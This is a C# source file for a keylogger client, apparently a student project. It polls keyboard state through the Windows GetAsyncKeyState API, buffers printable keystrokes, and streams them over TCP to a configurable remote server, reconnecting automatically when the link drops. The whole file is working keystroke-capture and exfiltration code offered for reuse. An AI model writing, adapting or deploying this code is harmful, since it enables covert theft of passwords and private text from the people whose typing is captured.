/*************************************************************************
 *                                                                       *
 *  File:        KeyloggerClient.cs                                      *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: A console-based keylogger client that captures and      *
 *               sends keystrokes to a remote server using TCP.          *
 *               Identifies itself to the server and transmits captured  *
 *               data in real time. Includes support for asynchronous    *
 *               logging and cancellation.                               *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/


using System;
using System.Net.Sockets;
using System.Runtime.InteropServices; // for using GetAsyncKeyState()
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Common;

namespace KeyloggerClient
{
    public class KeyloggerClient
    {
        /// <summary>
        /// Imports the GetAsyncKeyState function from user32.dll.
        /// Used to check the state of a virtual key at the time the function is called.
        /// </summary>
        /// <param name="i">The virtual-key code.</param>
        /// <returns>A short value indicating the key state.</returns>
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private TcpClient client;
        private NetworkStream stream;
        private StringBuilder keyBuffer = new StringBuilder(); // stores captured keystrokes
        private DateTime lastSend = DateTime.Now; // tracks last time data was sent
        private CancellationTokenSource cts; // cancel the key capture loop

        public bool IsConnected => client?.Connected == true;
        public bool _running = false;

        /// <summary>
        /// Starts the keylogger client by connecting to the specified server and beginning the key capture loop.
        /// </summary>
        /// <param name="host">The IP address of the server (default is "127.0.0.1").</param>
        /// <param name="port">The port to connect to (default is 5000).</param>
        /// <param name="cancellationToken">Cancellation token to stop the client.</param>
        /// <returns>A Task representing the asynchronous operation.</returns>
        public async Task StartAsync(CancellationToken cancellationToken = default, string host = "127.0.0.1", int port = 5000)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    client = new TcpClient(host, port);
                    stream = client.GetStream();

                    // Sends a handshake message to identify this as a client.
                    byte[] handshake = Encoding.UTF8.GetBytes("client");
                    await stream.WriteAsync(handshake, 0, handshake.Length);

                    cts = new CancellationTokenSource();

                    Console.WriteLine("Client: running");

                    var captureTask = Task.Run(() => CaptureKeysLoop(cts.Token), cancellationToken);

                    _running = true;

                    // Wait until capture task exits or cancellation is requested
                    while (_running && !cancellationToken.IsCancellationRequested && !captureTask.IsCompleted)
                    {
                        await Task.Delay(1000, cancellationToken);
                    }

                    if (captureTask.IsFaulted)
                    {
                        Console.WriteLine("Capture loop failed. Reconnecting...");
                        throw captureTask.Exception?.InnerException ?? new KeyloggerException("Capture loop failed.");
                    }
                }
                catch (Exception ex)
                {
                    var kex = new KeyloggerException("Error occured while trying to connect to server", ex);
                    Console.WriteLine(kex);
                }
                finally
                {
                    Stop();
                }

                // Reconnect logic
                Console.WriteLine("Attempting to reconnect in 3 seconds...");
                await Task.Delay(3000, cancellationToken);
            }
        }

        /// <summary>
        /// Stops the keylogger client by cancelling the loop and closing the network connection.
        /// </summary>
        public void Stop()
        {
            if (!_running) return;

            _running = false;
            cts?.Cancel();
            stream?.Close();
            client?.Close();

            Console.WriteLine("Client stopped.");
        }

        /// <summary>
        /// Continuously captures keystrokes and sends them to the server periodically.
        /// Only printable ASCII characters (32 to 126) are captured.
        /// </summary>
        /// <param name="token">A cancellation token used to stop the loop safely.</param>
        /// <returns>A Task representing the asynchronous operation.</returns>
        private async Task CaptureKeysLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    await Task.Delay(5); // Small delay to reduce CPU usage

                    /// <summary>
                    /// Iterates through printable ASCII characters and checks if any were pressed.
                    /// </summary>
                    CaptureKeys();

                    await SendData();
                }
            }
            catch (Exception ex)
            {
                throw new KeyloggerException("Error occurred while capturing or sending keys.", ex);
            }
        }

        /// <summary>
        /// Captures pressed keys and appends them to the buffer.
        /// </summary>
        /// <param name="character">Optional character to add directly.</param>
        public void CaptureKeys(char character = ' ')
        {
            if (character != ' ')
            {
                keyBuffer.Append(character);
            }

            for (int i = 32; i < 127; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if ((keyState & 0x1) != 0)
                {
                    char keyChar = (char)i;
                    Console.Write(keyChar + ", ");
                    keyBuffer.Append(keyChar);
                }
            }
        }

        /// <summary>
        /// Sends captured key data to the server every 100ms if there is data to send.
        /// </summary>
        /// <returns>A Task representing the asynchronous send operation.</returns>
        public async Task SendData()
        {
            if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
            {
                string message = keyBuffer.ToString();
                byte[] data = Encoding.UTF8.GetBytes(message);

                try
                {
                    await stream.WriteAsync(data, 0, data.Length);
                    keyBuffer.Clear();
                    lastSend = DateTime.Now;
                }
                catch (Exception ex)
                {
                    var kex = new KeyloggerException("Connection lost to server", ex);
                    Console.WriteLine(kex);
                    throw; // Let the outer loop handle reconnect
                }

            }
        }

        /// <summary>
        /// Gets the current key buffer content as a string.
        /// </summary>
        /// <returns>The buffered keystrokes.</returns>
        public string getKeyBuffer()
        {
            return keyBuffer.ToString();
        }
    }
}
